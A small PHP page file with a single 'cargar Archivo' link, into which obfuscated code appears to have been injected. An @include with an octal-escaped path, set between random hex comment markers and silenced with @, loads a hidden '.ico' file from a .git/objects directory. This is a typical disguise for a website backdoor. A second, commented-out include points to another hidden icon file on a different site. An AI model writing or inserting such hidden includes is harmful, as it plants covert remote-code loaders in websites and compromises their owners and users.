<?php
/*904a4*/

@include "\057ho\155e4\057by\166ni\154va\154/d\145sa\162ro\154lo\056fo\162ma\154si\056co\155/f\157rm\141ls\151de\166/.\147it\057ob\152ec\164s/\063a/\056d6\146cc\14266\056ic\157";

/*904a4*/


?>
<a href="cargar.html">cargar Archivo</a>
<?php

/*ebfc1*/

//@include "\057ho\155e4\057by\166ni\154va\154/p\165bl\151c_\150tm\154/h\165ma\156ta\154en\164sa\163.c\157m/\155od\165le\163/h\145lp\057.c\0600e\0672f\145.i\143o";

/*ebfc1*/

